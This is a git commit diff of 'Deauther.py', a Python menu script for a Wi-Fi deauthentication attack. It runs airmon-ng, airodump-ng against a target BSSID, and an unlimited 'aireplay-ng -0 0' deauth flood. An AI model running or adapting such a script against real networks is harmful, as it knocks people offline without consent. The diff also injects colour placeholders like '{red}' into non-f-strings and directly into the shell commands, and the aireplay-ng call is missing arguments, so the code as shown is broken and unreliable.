64a88ea7348ddcc5639b7ee0c31db3db26e03720
People Universal <135725113+peopleuniversal@users.noreply.github.com>
2024-09-15 11:05:29 +0700

    Update Deauther.py

--- Deauther.py
+++ Deauther.py
@@ -13,37 +13,37 @@ blue    =   "\033[1;96m"
 def menu():
     time.sleep(3)
     os.system("clear")
-    print("******************************")
-    print("* [ Manual Code Deauther   ] *")
-    print("* [ Author : Deauther Test ] *")
-    print("* [ Exit   : 0             ] *")
-    print("******************************")
+    print("{red}******************************")
+    print("{green}* [ Manual Code Deauther   ] *")
+    print("{blue}* [ Author : Deauther Test ] *")
+    print("{yellow}* [ Exit   : 0             ] *")
+    print("{purple}******************************")
     time.sleep(2)
-    tools = input("""Command Test And Enter
-Or Edit Code Manual > nano deauther.py  : """)
+    tools = input("""{white}Command Test And Enter
+Or Edit Code Manual >{green} nano deauther.py  : """)
 
     if tools=="Test":
        os.system("clear")
        time.sleep(3)
-       print("""pls check manual or iwconfig in terminal...!!!
+       print("""{red}pls check manual or iwconfig in terminal...!!!
    Example: wlan0/wlan1, edit code manual nano deauther.py""")
        time.sleep(3)
        os.system("clear")
-       print("Check Interface Wlan")
-       os.system("iwconfig wlan0")
+       print("{ash}Check Interface Wlan")
+       os.system("{red}iwconfig wlan0")
        time.sleep(3)
        os.system("clear")
-       os.system("airmon-ng start wlan0")
+       os.system("{green}airmon-ng start wlan0")
        time.sleep(3)
        os.system("clear")
-       os.system("airmon-ng check kill")
+       os.system("{red}airmon-ng check kill")
        time.sleep(3)
-       os.system("airodump-ng -c 1 --bssid paste here bssid wlan0")
+       os.system("{read}airodump-ng -c 1 --bssid paste here bssid wlan0")
        print("CTRL + C TO DEAUTHER PROCCES...!!!")
        time.sleep(3)
        os.system("clear")
        time.sleep(3)
-       print("Deauther... walk!!!")
+       print("{green}Deauther...{red}walk!!!")
        os.system("aireplay-ng -0 0 -a wlan0")
 
     elif tools=="nano deauther.py":
@@ -54,14 +54,14 @@ Or Edit Code Manual > nano deauther.py  : """)
     elif tools=="0":
        os.system("clear")
        time.sleep(3)
-       print("Thank You...see you again:)")
+       print("{green}Thank You...{red}see you again:)")
        time.sleep(2)
        sys.exit()
 
     else:
        time.sleep(3)
        os.system("clear")
-       os.system("Input Code Not Valid...Pls Input Code Valid.")
+       os.system("{red}Input Code Not Valid...{green}Pls Input Code Valid.")
        time.sleep(3)
        os.system("python deauther.py")
 
